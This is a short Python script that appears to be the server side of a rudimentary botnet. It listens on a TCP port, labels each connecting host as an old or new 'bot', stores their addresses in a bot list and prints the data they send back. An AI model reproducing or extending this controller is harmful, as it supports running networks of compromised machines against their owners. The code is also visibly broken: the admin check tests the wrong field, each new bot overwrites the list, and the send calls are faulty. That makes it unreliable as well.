import socket
from colorama import Fore, Back, Style
sock = socket.socket()

sock.bind(('', 25094))
sock.listen(10000)

while True:

  conn, addr = sock.accept()

  print(Fore.GREEN + ' [!] Connection:' + Fore.BLUE , addr)

  f = open("bot_list.txt", 'r')
  text = f.read()
  f.close()

  comaddr = str(addr)
  con = comaddr.split()

  if con[1] == "('127.0.0.1',":


     print(Fore.CYAN + " [•] " + Fore.YELLOW + "Admin")
     try:
       data = conn.recv(1024).decode()
       print(data)
     except:
       pass
       if not data:
        conn.send(data.upper())
        conn.close()
  if con[0] in text:
    print(Fore.CYAN + " [+] " + Fore.MAGENTA + "Old bot")
    print("")
  else:
    f = open("bot_list.txt", 'w')
    f.write(con[0] + '\n')
    f.close()
    print(Fore.CYAN + " [+] " + Fore.BLUE + "New bot!!!")
    print("")
    data = conn.recv(10240)
    print(data)
    if not data:
      conn.send(data.upper())
      conn.close()
